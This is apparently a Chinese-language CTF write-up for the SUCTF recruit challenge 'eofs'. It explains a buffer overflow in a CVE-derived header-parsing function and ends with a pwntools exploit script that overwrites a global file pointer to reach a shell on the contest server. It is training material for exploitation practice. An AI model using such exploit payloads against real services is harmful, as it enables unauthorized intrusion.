---
title: eofs
categories:
- SUCTF招新赛
---
# SUCTF->eofs

## 前言

这个招新赛的题目比较简单，去做了几道简单题，这是第一次接触文件的题，现学的文件，最后还是没做出来，中间还是有一些经验，比如看到一个不太正常的函数名(lookForHeader)最好先去查一下这个函数，说不定就是哪个CVE改编来的，看之前的CVE复现或者讲解有利于做题，不能闷头做

## 程序逻辑

程序的main函数里打开了同级目录下的readme.txt，句柄为fd，此时注意fd并不是局部变量，而是位于bss段的0x602180的全局变量，后面从标准输入中读取最多0x1F40-1字节的数据，观察s的位置，并不能覆盖返回地址或者哪里，再往下看su_server

![main](./1.jpg)

su_server先以时间为种子生成随机数，之后清空host、username和researchfield等几个bss段全局变量的值，其中host地址为0x602220、username地址为0x6021a0、researchfield地址为0x602100.v3随机数先赋值给0x60229F、0x60221F、0x60217F等三个地址，之后用户输入作为参数传入lookForHeader函数，下面if的条件是只要上面三个地址任意一个值不为v3就为真。之前v3已经被赋值了，这里不再相等要么溢出到v3修改掉，要么之前的三个地址里有一个被覆写掉。亦或者有个地址任意写最好。假设现在进了条件，要进入secret()拿到shell，还得让fd->_flag == 0xdeadbeef，即0x602180的值为0xdeadbeef的地址，观察一下地址之间的差值，发现是可以通过覆写host、username、researchfield的值来改掉三个变量，只要lookForHeader里的函数有溢出漏洞即可，并且由于fd和researchfield之间为0x80的距离，是很有可能被溢出的，下面继续看lookForHeader

![su_server](./2.jpg)

lookForHeader其实是一个CVE里的漏洞函数，做题的时候没有去查蛮遗憾，但是实际上这个函数也并不难理解，是自己的逆向的水平太低，看代码看不来，以后需要提高这方面的水平.

lookForHeader的注释标注了逻辑，也就是说我们需要构造几个相同格式的字符串部分以造成溢出，进而覆写fd

![lookForHeader](./3.jpg)
![lookForHeader2](./4.jpg)

## 数据构造

首先绕过su_server里的srncmp，即payload = 'GET / HT',看起来好看一点的话就全留下来好了
```
payload = 'GET / HTTP/1.1#'
payload += 'Host:127.0.0.1#'
payload += 'Username:xmzyshypnc#'
payload += 'ResearchField:'
payload += p64(0xdeadbeef)
payload += 'a'*0x38+'#'
payload += 'ResearchField:'+'a'*0x40+p64(0x602100)+'#'
```
又因为0x60217F在溢出范围内，所以if也可以进去，下面是exp

## exp.py

```python
#coding=utf-8
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level="DEBUG")
if debug:
    sh = process('./eofs')
else:
    sh = remote('43.254.3.203',10002)
#gdb.attach(sh)

payload = 'GET / HTTP/1.1#'
payload += 'Host:127.0.0.1#'
payload += 'Username:xmzyshypnc#'
payload += 'ResearchField:'
payload += p64(0xdeadbeef)
payload += 'a'*0x38+'#'
payload += 'ResearchField:'+'a'*0x40+p64(0x602100)+'#'

print payload
sh.sendline(payload)
sh.interactive()
```

## flag

![flag](./6.jpg)

